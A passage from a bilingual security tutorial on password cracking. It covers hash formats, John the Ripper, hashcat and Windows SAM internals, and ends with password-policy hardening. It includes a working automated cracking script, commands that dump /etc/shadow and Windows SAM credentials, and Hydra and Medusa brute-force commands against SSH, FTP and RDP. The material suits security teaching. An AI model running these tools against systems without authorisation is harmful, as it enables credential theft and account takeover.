# lcredit=-1: 소문자 최소 1개

# 계정 잠금 (5번 실패 시)
auth required pam_tally2.so onerr=fail audit silent deny=5 unlock_time=900
```

### Windows 보안 정책
```
# secpol.msc → 계정 정책

비밀번호 정책:
- 최소 길이: 12자 이상
- 복잡성 요구: 사용
- 최대 사용 기간: 90일

계정 잠금 정책:
- 잠금 임계값: 5번
- 잠금 기간: 30분
- 잠금 카운터 리셋: 15분
```


---

<a name="english"></a>

# Password Cracking — Theory and Practice

## 1. Password Hash Basics

### Hash Function Properties
- **One-way**: Cannot recover original text from hash value
- **Same input → Same output**: Same password always produces same hash
- **Avalanche effect**: Changing 1 bit of input produces completely different hash

### Major Hash Algorithms
| Algorithm | Length | Security | Example |
|-----------|--------|----------|---------|
| MD5 | 128-bit (32 chars) | Weak | 5f4dcc3b5aa765d61d8327deb882cf99 |
| SHA-1 | 160-bit (40 chars) | Weak | 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 |
| SHA-256 | 256-bit (64 chars) | Good | 5e884898da28047151d0e56f8dc6292... |
| SHA-512 | 512-bit (128 chars) | Strong | - |
| bcrypt | Variable | Strong | $2y$10$... |
| PBKDF2 | Variable | Strong | Iterated hash |

### Hash Identification Methods

The hashid tool automatically identifies the algorithm type of a hash string. It can distinguish between various hash formats like MD5, SHA-1, and bcrypt.

```bash
# Identify hash type with hashid
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
hashid '$1$abc$xyz...'
hashid '$6$salt$hash...'

# hash-identifier tool
hash-identifier

# Manual identification
# $1$ → MD5 crypt
# $5$ → SHA-256 crypt
# $6$ → SHA-512 crypt (current Linux default)
# $2y$ or $2b$ → bcrypt
# $apr1$ → Apache MD5
```

### Automated Hash Identification and Cracking (Python)

```python
#!/usr/bin/env python3
"""
Automated hash identification and cracking tool
- Auto-detect hash format
- Automatically invoke John the Ripper / hashcat
- Batch process multiple hashes
Usage: python3 hash_cracker.py -H '<hash>' -w rockyou.txt
       python3 hash_cracker.py -f hashes.txt -w wordlist.txt --tool hashcat
"""
import argparse
import hashlib
import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path


# Hash patterns → (name, hashcat mode, john format)
HASH_SIGNATURES: list[tuple[re.Pattern, str, str, str]] = [
    (re.compile(r"^\$6\$[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{86}$"),
     "SHA-512 crypt", "1800", "sha512crypt"),
    (re.compile(r"^\$5\$[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{43}$"),
     "SHA-256 crypt", "7400", "sha256crypt"),
    (re.compile(r"^\$2[ayb]\$\d{2}\$[./A-Za-z0-9]{53}$"),
     "bcrypt", "3200", "bcrypt"),
    (re.compile(r"^\$1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}$"),
     "MD5 crypt", "500", "md5crypt"),
    (re.compile(r"^\$apr1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}$"),
     "Apache MD5", "1600", "md5crypt-opencl"),
    (re.compile(r"^[0-9a-fA-F]{128}$"),
     "SHA-512", "1700", "raw-sha512"),
    (re.compile(r"^[0-9a-fA-F]{64}$"),
     "SHA-256", "1400", "raw-sha256"),
    (re.compile(r"^[0-9a-fA-F]{40}$"),
     "SHA-1", "100", "raw-sha1"),
    (re.compile(r"^[0-9a-fA-F]{32}$"),
     "MD5", "0", "raw-md5"),
    (re.compile(r"^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$"),
     "NTLM (LM:NTLM)", "1000", "nt"),
    (re.compile(r"^aad3b435b51404eeaad3b435b51404ee:[0-9a-fA-F]{32}$"),
     "NTLM (empty LM)", "1000", "nt"),
]


def identify_hash(hash_str: str) -> tuple[str, str, str]:
    """Analyze hash string and return (name, hashcat_mode, john_format)."""
    h = hash_str.strip()
    for pattern, name, hc_mode, john_fmt in HASH_SIGNATURES:
        if pattern.match(h):
            return name, hc_mode, john_fmt
    return "Unknown", "", ""


def verify_hash(plaintext: str, hash_str: str, hash_name: str) -> bool:
    """Simple local verification (MD5/SHA-1/SHA-256/SHA-512)."""
    name_lower = hash_name.lower()
    algo_map = {
        "md5": hashlib.md5,
        "sha-1": hashlib.sha1,
        "sha-256": hashlib.sha256,
        "sha-512": hashlib.sha512,
    }
    for key, fn in algo_map.items():
        if key in name_lower:
            return fn(plaintext.encode()).hexdigest().lower() == hash_str.lower()
    return False


def crack_with_john(hash_str: str, john_fmt: str, wordlist: Path) -> str | None:
    """Crack single hash with John the Ripper. Returns plaintext on success."""
    john_bin = shutil.which("john")
    if not john_bin:
        print("[!] john not found")
        return None

    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
        tf.write(f"target:{hash_str}\n")
        hash_file = tf.name

    try:
        cmd = [john_bin, f"--wordlist={wordlist}", f"--format={john_fmt}", hash_file]
        print(f"  [*] Running: {' '.join(cmd)}")
        subprocess.run(cmd, capture_output=True, timeout=300)

        # Check results
        result = subprocess.run(
            [john_bin, "--show", f"--format={john_fmt}", hash_file],
            capture_output=True, text=True, timeout=10,
        )
        for line in result.stdout.splitlines():
            if ":" in line and not line.startswith("0 password"):
                return line.split(":", 1)[1].strip()
    except subprocess.TimeoutExpired:
        print("[!] john timed out")
    finally:
        Path(hash_file).unlink(missing_ok=True)

    return None


def crack_with_hashcat(hash_str: str, hc_mode: str, wordlist: Path) -> str | None:
    """Crack single hash with hashcat. Returns plaintext on success."""
    hashcat_bin = shutil.which("hashcat")
    if not hashcat_bin:
        print("[!] hashcat not found")
        return None

    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
        tf.write(f"{hash_str}\n")
        hash_file = tf.name

    outfile = hash_file + ".cracked"
    try:
        cmd = [
            hashcat_bin, "-m", hc_mode, "-a", "0",
            "--quiet", "--potfile-disable",
            "-o", outfile,
            hash_file, str(wordlist),
        ]
        print(f"  [*] Running: hashcat -m {hc_mode} ...")
        subprocess.run(cmd, capture_output=True, timeout=600)

        cracked = Path(outfile)
        if cracked.exists():
            content = cracked.read_text().strip()
            if ":" in content:
                return content.split(":", 1)[1]
    except subprocess.TimeoutExpired:
        print("[!] hashcat timed out")
    finally:
        Path(hash_file).unlink(missing_ok=True)
        Path(outfile).unlink(missing_ok=True)

    return None


def process_hashes(hashes: list[str], wordlist: Path, tool: str) -> None:
    for i, h in enumerate(hashes, 1):
        h = h.strip()
        if not h:
            continue
        print(f"\n[{i}/{len(hashes)}] Hash: {h[:60]}{'...' if len(h) > 60 else ''}")
        name, hc_mode, john_fmt = identify_hash(h)
        print(f"  Format detected: {name}  (hashcat={hc_mode}, john={john_fmt})")

        if name == "Unknown":
            print("  [!] Unknown format — manual verification required")
            continue

        cracked: str | None = None
        if tool in ("john", "auto") and john_fmt:
            cracked = crack_with_john(h, john_fmt, wordlist)
        if cracked is None and tool in ("hashcat", "auto") and hc_mode:
            cracked = crack_with_hashcat(h, hc_mode, wordlist)

        if cracked:
            print(f"  [+] Crack successful: {cracked}")
            if verify_hash(cracked, h, name):
                print(f"  [+] Verified")
        else:
            print(f"  [-] Crack failed (not found in wordlist)")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Automated hash identification and cracking tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  python3 hash_cracker.py -H '5f4dcc3b5aa765d61d8327deb882cf99' -w rockyou.txt
  python3 hash_cracker.py -f hashes.txt -w wordlist.txt --tool hashcat
  python3 hash_cracker.py -H '$6$salt$hash...' -w rockyou.txt --tool john
        """,
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-H", "--hash", help="Single hash string")
    group.add_argument("-f", "--file", type=Path, help="Hash list file (one per line)")

    parser.add_argument("-w", "--wordlist", type=Path, required=True, help="Wordlist file")
    parser.add_argument("--tool", choices=["john", "hashcat", "auto"], default="auto",
                        help="Cracking tool to use (default: auto)")
    args = parser.parse_args()

    if not args.wordlist.exists():
        sys.exit(f"[!] Wordlist file not found: {args.wordlist}")

    if args.hash:
        hashes = [args.hash]
    else:
        if not args.file.exists():
            sys.exit(f"[!] Hash file not found: {args.file}")
        hashes = args.file.read_text().splitlines()

    print(f"[*] Hashes to process: {len(hashes)}  |  Wordlist: {args.wordlist}")
    process_hashes(hashes, args.wordlist, args.tool)


if __name__ == "__main__":
    main()
```

---

## 2. Linux Password Structure

### /etc/shadow File Format
```
username:$id$salt$hash:lastchange:min:max:warn:inactive:expire:reserved

Example:
root:$6$R8Fsra2UhPITBTnR$SttrOIIggOjtCtwag.O4JHnCCMQ8rvsqaCuU2VV1Mlvk...:15285:0:99999:7:::

Field interpretation:
- username: root
- $id: $6 = SHA-512 algorithm
- $salt: R8Fsra2UhPITBTnR (random salt)
- $hash: actual hash value
- lastchange: 15285 (days since 1970-01-01)
- min: 0 (minimum password age)
- max: 99999 (password expiry days)
- warn: 7 (warn 7 days before expiry)
```

### Role of Salt
```
Without salt:
  password → 5f4dcc3b5aa765d... (always same → rainbow table attack possible)

With salt:
  password + salt_a → seemingly random hash_a
  password + salt_b → completely different hash_b
  (same password with different salt produces different hash → defeats rainbow tables)
```

### Direct Hash Generation and Verification (C Code)

C code to generate and verify hashes. Helps understand how hash functions work at the system level.

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <crypt.h>
#include <stdlib.h>

int main(void) {
    char *pHash;
    char *pWord;
    char *pResult;

    pHash = (char*) calloc(20, sizeof(char));
    pWord = (char*) calloc(30, sizeof(char));

    strcpy(pWord, "mypassword");
    strcpy(pHash, "$6$R8Fsra2UhPITBTnR$");  // Specify only the salt portion

    pResult = crypt(pWord, pHash);
    printf("%s\n", pResult);

    free(pWord);
    free(pHash);
    return 0;
}
```
```bash
gcc -o hashtest hashtest.c -lcrypt
./hashtest
# Compare output hash with /etc/shadow hash to verify
```

### Hash Generation and Verification with Python

```python
#!/usr/bin/env python3
"""
Linux shadow-compatible hash generation and verification tool
Usage: python3 shadow_hash.py generate <password> [--algorithm sha512]
       python3 shadow_hash.py verify <password> <shadow_entry>
"""
import argparse
import hashlib
import os
import secrets
import sys


def generate_salt(length: int = 16) -> str:
    """Generate shadow-compatible salt string (./A-Za-z0-9)."""
    alphabet = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    return "".join(secrets.choice(alphabet) for _ in range(length))


def make_shadow_hash(password: str, algorithm: str = "sha512", salt: str | None = None) -> str:
    """Generate Linux shadow file-compatible hash."""
    algo_map = {"md5": "1", "sha256": "5", "sha512": "6"}
    if algorithm not in algo_map:
        sys.exit(f"[!] Unsupported algorithm: {algorithm}")

    import crypt  # Available in Python 3.9 and below (removed in 3.13)
    prefix = algo_map[algorithm]
    salt = salt or generate_salt(16)
    salt_str = f"${prefix}${salt}$"
    return crypt.crypt(password, salt_str)


def verify_shadow_entry(password: str, shadow_hash: str) -> bool:
    """Check if password matches shadow hash."""
    import crypt
    return crypt.crypt(password, shadow_hash) == shadow_hash


def main() -> None:
    parser = argparse.ArgumentParser(description="Linux shadow hash generation/verification")
    sub = parser.add_subparsers(dest="action")

    gen = sub.add_parser("generate", help="Generate hash")
    gen.add_argument("password", help="Password to hash")
    gen.add_argument("-a", "--algorithm", choices=["md5", "sha256", "sha512"],
                     default="sha512", help="Hash algorithm (default: sha512)")
    gen.add_argument("--salt", help="Fixed salt (random if not specified)")

    ver = sub.add_parser("verify", help="Verify hash")
    ver.add_argument("password", help="Plaintext password to verify")
    ver.add_argument("hash", help="Shadow hash string")

    args = parser.parse_args()
    if not args.action:
        parser.print_help()
        return

    try:
        if args.action == "generate":
            h = make_shadow_hash(args.password, args.algorithm, args.salt)
            print(f"Hash: {h}")
            print(f"Shadow format: username:{h}:...")
        else:
            match = verify_shadow_entry(args.password, args.hash)
            print(f"[{'+' if match else '-'}] Password {'matches' if match else 'does not match'}")
            sys.exit(0 if match else 1)
    except ImportError:
        sys.exit("[!] crypt module not found — use passlib: pip3 install passlib")
    except Exception as e:
        sys.exit(f"[!] Error: {e}")


if __name__ == "__main__":
    main()
```

---

## 3. John the Ripper

### Installation and Basic Usage

John the Ripper cracking commands. Auto-detects hash format and applies default wordlist with mutation rules. Use `--show` to view already cracked results, and `--restore` to resume interrupted cracking.

```bash
# Package installation
apt-get install john

# Or compile from source
wget https://www.openwall.com/john/g/john-1.9.0.tar.gz
tar -xzvf john-1.9.0.tar.gz
cd john-1.9.0/src
make linux-x86-64

cd ../run
ls  # Verify john executable
```

### Basic Attack Modes

```bash
# 1. Brute force attack (default mode)
./john /etc/shadow

# 2. Dictionary attack (Wordlist)
./john --wordlist=password.lst /etc/shadow
./john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow

# 3. Rule-based attack (Wordlist + mutations)
./john --wordlist=password.lst --rules /etc/shadow

# 4. Specify format explicitly
./john --format=md5crypt shadow_md5.txt
./john --format=sha512crypt /etc/shadow
./john --format=NT /etc/shadow  # Windows NTLM

# 5. View results
./john --show /etc/shadow

# 6. Continue excluding already cracked
./john --restore /etc/shadow
```

### Custom Wordlist Extension

Extend existing wordlists by adding mutation patterns. Including target-specific words increases cracking success rate.

```bash
# Add to wordlist
echo "mypassword123" >> /usr/share/wordlists/custom.lst
echo "company2024!" >> /usr/share/wordlists/custom.lst

# Merge passwd + shadow with unshadow (required)
unshadow /etc/passwd /etc/shadow > combined.txt
./john --wordlist=rockyou.txt combined.txt
```

### john.conf Rule Customization

```
# Example rules that can be added to /etc/john/john.conf
[List.Rules:Custom]
: 			# Original word as-is
c 			# Capitalize first letter
u 			# All uppercase
l 			# All lowercase
$1 			# Append 1
$! 			# Append !
Az"[0-9]"		# Append digit
```

---

## 4. Hashcat

### GPU-Based High-Speed Cracking

hashcat GPU-based password cracking commands. Use `-m` to specify hash type (0=MD5, 1000=NTLM, 1800=SHA512crypt, etc.) and `-a` for attack mode. With a high-performance GPU, common passwords can be cracked in seconds to minutes.

```bash
# Check hash modes
hashcat --help | grep -i md5
hashcat --help | grep -i sha

# Key hash modes
# 0    = MD5
# 100  = SHA-1
# 1400 = SHA-256
# 1800 = SHA-512 (Linux shadow)
# 1000 = NTLM (Windows)
# 2500 = WPA/WPA2 (Wi-Fi)
# 3200 = bcrypt

# Dictionary attack
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1800 -a 0 shadow_hash.txt rockyou.txt

# Brute force attack (mask attack)
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a  # All chars, 6 digits

# Mask character classes
# ?l = lowercase [a-z]
# ?u = uppercase [A-Z]
# ?d = digits [0-9]
# ?s = special characters
# ?a = all (?l+?u+?d+?s)

# Rule-based attack
hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Combination attack (combine two words)
hashcat -m 0 -a 1 hash.txt words1.txt words2.txt

# GPU performance test
hashcat -b -m 0
```

---

## 5. Windows Password Cracking

### SAM Database Structure
```
Windows authentication flow:
  1. User input → Winlogon
  2. Winlogon → LSA (Local Security Authority)
  3. LSA → SAM (Security Accounts Manager)
  4. SAM: %SystemRoot%\system32\config\sam (locked while running)
  5. Security subsystem compares NTLM hash

SAM file location: C:\Windows\System32\config\SAM
SYSTEM file:       C:\Windows\System32\config\SYSTEM
```

### Windows Authentication Architecture (Detail)
```
Winlogon → LSA → SAM → SRM

1. Winlogon
   - Process handling user login
   - Passes credentials to LSA

2. LSA (Local Security Authority)
   - Handles local login
   - Checks security policies
   - Generates SID (Security Identifier)
   - Records security logs

3. SAM (Security Accounts Manager)
   - Database storing user/group account information
   - Compares input credentials with SAM database to authenticate
   - SAM file location: %SystemRoot%\system32\config\sam
   - Locked while system is running (cannot access directly)

4. SRM (Security Reference Monitor)
   - Assigns SIDs to objects
   - Controls file/directory access (Access) based on SID
   - Records audit logs
```

### Windows Authentication Protocol — Challenge & Response
```
Network authentication method: Challenge-Response protocol
(Client sends response to challenge over network)

Response generation algorithm:

1. LM (LAN Manager) — Very weak, legacy
   - Pads password to 14 chars, truncates if over 14
   - Converts all to uppercase
   - Splits into 7-char blocks and DES encrypts
   - Vulnerability: Can attack in 7-char units

2. NTLM — DES encryption-based, 1st generation
   - Uses MD4 hash
   - Stronger than LM but still vulnerable
   - Vulnerable to Pass-the-Hash attacks

3. NTLMv2 — Default method since Windows XP
   - Challenge-Response method
   - Combines server challenge + client challenge
   - Includes timestamp to defend against replay attacks
   - Relatively secure but crackable
```

### Cain & Abel Usage
```
1. Rainbow table cracking:
   Cracker → LM & NTLM Hashes → Add to List → Select cracking mode
   Cryptanalysis Attack → NTLM Hashes → Rainbow Table Crack

2. Dictionary attack:
   Dictionary Attack → NTLM Hashes → Specify wordlist file

3. Brute force:
   Brute-Force Attack → Select character set
```

### Windows SAM Dump (Admin Privileges Required)

```bash
# Metasploit Meterpreter
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::

# secretsdump.py (impacket)
python secretsdump.py Administrator:password@192.168.1.100

# fgdump.exe (run from within Windows)
fgdump.exe

# Use Volume Shadow Copy (copy locked SAM file)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\
```

### Ophcrack (Rainbow Tables)

Ophcrack is a Windows password cracking tool using rainbow tables. Can crack NTLM hashes very quickly, but table files are very large.

```bash
# Install on Kali
apt-get install ophcrack

# Offline cracking with LiveCD version
# 1. Boot Ophcrack LiveCD
# 2. Automatically detects Windows SAM file
# 3. Automatically cracks LM hashes with rainbow tables

# Download rainbow tables (separately)
# tables_vista_free: for Vista/7
# tables_xp_free: for XP (3.8GB)
```

---

## 6. Wordlist Strategy

### Well-Known Wordlists

Default wordlist files included with Kali Linux. rockyou.txt is the most widely used dictionary file.

```bash
# Kali Linux built-in
ls /usr/share/wordlists/
# rockyou.txt (14 million - actual leaked passwords)

# SecLists (best wordlist collection)
git clone https://github.com/danielmiessler/SecLists /opt/seclists

# Key paths
/opt/seclists/Passwords/
/opt/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
```

### Custom Wordlist Generation

#### CeWL (Website-based)

CeWL crawls a target website to generate a custom wordlist of words relevant to that organization.

```bash
# Extract words from target website
cewl http://target.com -d 3 -m 5 -w custom_wordlist.txt
# -d 3 : crawl up to 3 levels deep
# -m 5 : minimum 5 characters
```

#### Crunch (Pattern-based generation)

Generate wordlists based on specific patterns and character sets with Crunch. Effective when you know the password policy.

```bash
# 4-digit number combinations (0000~9999)
crunch 4 4 0123456789 -o pin.txt

# 6 lowercase characters
crunch 6 6 abcdefghijklmnopqrstuvwxyz -o lowercase6.txt

# Specific pattern (@ = lowercase, , = uppercase, % = digit, ^ = special)
crunch 8 8 -t @@@@%%%% -o pattern.txt  # 4 lowercase + 4 digits

# Combination
crunch 6 8 abc123!@ -o combo.txt
```

---

## 7. WinRTGen (Rainbow Table Generation)

```
WinRTGen is a tool for generating rainbow tables directly
(Downloading pre-generated tables is more efficient)

Configuration parameters:
- Hash: Select NTLM, LM, MD5, etc.
- Charset: Character set (alphanumeric, etc.)
- Min/Max Length: Password length range
- Table Count: Number of tables to generate
- Chain Length: Chain length (larger = less time, larger file size)

Generation time:
- Requires high-performance GPU
- Using pre-generated tables is practical
```

---

## 8. FTP Brute Force — white.c Practice Tool

### white.c Compilation and Execution

Steps to compile and run the white.c multi-threaded password cracker. Must link the pthread library for compilation.

```bash
# Compile source (pthread link required)
gcc -o ftpcrack white.c -lpthread

# Enter target server info when running
./ftpcrack
# Server IP  : 192.168.203.129  (Windows Server 2008)
# Target ID  : tester           (FTP account ID)
```

### Attack Menu Structure
```
white> help

No.  Description                        Shortcut
---  ---------------------------------  --------
1    Sequential brute force (single)    a. [One Process] Sequence Brute Forcing Attack
2    Random brute force (single)        b. [One Process] Random Brute Forcing Attack
3    Dictionary attack (single)         c. [One Process] Dictionary Attack
4    Sequential brute force (multi)     d. [Multi Threading] Sequence Brute Forcing Attack
5    Exit program                       e. [Multi Threading] Random Brute Forcing Attack
                                        f. [Multi Threading] Random Brute Forcing Attack + swap first char case

Default character set:
  0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
```

### Dictionary Attack Execution Example

```bash
# Enter c → Run [One Process] Dictionary Attack
# Sequential attack using words from wordlist.txt
white> c

# Multi-threading attack (enter d)
# Sequential brute force with multiple threads → improved speed
white> d
```

### Environment Setup
```
1. Install Windows Server 2008 (FTP server)
2. Install IIS FTP and create accounts
   net user /add test1 12345
   net user /add test2 asdf
   net user /add test3 qwer12
3. Allow ICMP in firewall (for ping communication check)
4. Compile and run white.c from CentOS (attacker)
```

---

## 8-2. Online Cracking Tools

### Hydra (Network Service Brute Forcer)

Hydra is an online password brute force tool supporting dozens of protocols including SSH, FTP, HTTP, and SMB. It directly attempts login credentials against online services using wordfiles or brute force.

```bash
# SSH brute force
hydra -l root -P rockyou.txt ssh://192.168.1.100

# FTP brute force
hydra -l admin -P rockyou.txt ftp://192.168.1.100

# HTTP form brute force
hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# RDP brute force
hydra -l Administrator -P rockyou.txt rdp://192.168.1.100

# Multi-thread configuration
hydra -l admin -P rockyou.txt -t 16 ssh://192.168.1.100

# Use user list
hydra -L users.txt -P rockyou.txt ssh://192.168.1.100
```

### Medusa

Medusa is a parallel online login brute force tool. Supports various protocols including FTP, SSH, and HTTP.

```bash
# FTP attack
medusa -h 192.168.1.100 -u admin -P rockyou.txt -M ftp

# SSH attack
medusa -h 192.168.1.100 -u root -P rockyou.txt -M ssh -t 8

# SMB attack
medusa -h 192.168.1.100 -u administrator -P rockyou.txt -M smbnt
```

---

## 9. Password Policy and Security Hardening

### /etc/login.defs Configuration (Linux)
```
PASS_MAX_DAYS   90     # Maximum 90 days
PASS_MIN_DAYS   1      # Minimum 1 day retention
PASS_WARN_AGE   7      # Warn 7 days before expiry
PASS_MIN_LEN    8      # Minimum 8 characters
```

### PAM Configuration (Linux PAM Module)

Harden Linux password policies with PAM (Pluggable Authentication Modules). Can configure minimum length, complexity, account lockout, and more.

```bash
# /etc/pam.d/common-password
password requisite pam_pwquality.so retry=3 minlen=12 \
    dcredit=-1 ucredit=-1 ocredit=-1 lcredit=-1

# Meanings:
# retry=3: 3 retries
# minlen=12: minimum 12 characters
# dcredit=-1: minimum 1 digit
# ucredit=-1: minimum 1 uppercase
# ocredit=-1: minimum 1 special character
# lcredit=-1: minimum 1 lowercase

# Account lockout (after 5 failures)
auth required pam_tally2.so onerr=fail audit silent deny=5 unlock_time=900
```

### Windows Security Policy
```
# secpol.msc → Account Policies

Password Policy:
- Minimum length: 12 characters or more
- Complexity requirements: Enabled
- Maximum password age: 90 days

Account Lockout Policy:
- Lockout threshold: 5 attempts
- Lockout duration: 30 minutes
- Reset lockout counter after: 15 minutes
```
